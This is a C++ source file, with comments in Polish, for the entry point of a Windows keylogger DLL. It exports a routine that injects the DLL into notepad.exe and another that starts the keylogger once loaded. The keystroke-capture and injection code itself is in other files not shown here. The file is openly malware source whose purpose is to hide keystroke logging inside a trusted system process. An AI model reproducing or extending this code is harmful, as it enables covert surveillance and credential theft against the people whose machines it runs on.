#include "Includes.h"

BOOL wasDllMainCalled = FALSE;
HMODULE dllParam;

LPSTR targetPath = const_cast<LPSTR>("C:\\Windows\\System32\\notepad.exe");

/* Nazwa firstEntry jest znana w LoadMe i uruchamiana tam */
extern "C" __declspec(dllexport) void firstEntry() {
	char dllPath[MAX_PATH];

	DWORD ret = GetModuleFileNameA((HINSTANCE)dllParam, dllPath, MAX_PATH);
	if (ret == 0) return;

	char test[1024];
	wsprintfA(test, "%s", dllPath);
	MessageBoxA(0, test, "Keylogger", MB_ICONINFORMATION | MB_OK);

	InjectTools::AutoInject(targetPath, dllPath);
}

/* Nazwa znana w InjectTools.cpp */
extern "C" __declspec(dllexport) void entryPoint() {
	if (wasDllMainCalled) {
		Keylogger::Init();
	} else {
		MessageBoxA(0, "DllMain wasn't called!", "Keylogger", MB_ICONINFORMATION | MB_OK);
	}
}

BOOL APIENTRY DllMain(HMODULE Base, DWORD Callback, LPVOID Parm) {
	dllParam = (HMODULE)Base;
	wasDllMainCalled = TRUE;

	switch (Callback) {
		case DLL_PROCESS_ATTACH: {
			break;
		}
		case DLL_PROCESS_DETACH:
			break;
		default:
			break;
	}

	return TRUE;
}